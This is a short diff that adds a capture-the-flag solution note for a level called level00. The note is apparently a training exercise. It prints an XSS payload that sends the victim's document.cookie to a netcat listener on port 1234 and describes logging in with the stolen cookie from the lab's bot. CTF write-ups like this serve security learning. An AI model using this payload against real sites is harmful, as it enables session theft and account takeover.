@@ -1,1 +1,12 @@
-Blablabla
+The easiest way to solve level00 would probably be something like 
+
+<script>
+new Image().src="http://127.0.0.1:1234/"+(document.cookie);
+</script>
+
+and then using netcat `nc -lvp 1234` to listen on the custom port choise of yours.
+
+Once our PhantomJS XSS bot accesses the vulnerable URL and executes our payload, 
+we receive a callback to our listener with the cookies included in the request path.
+After then it's just extracting it and login to the next level, and here you are :)
+
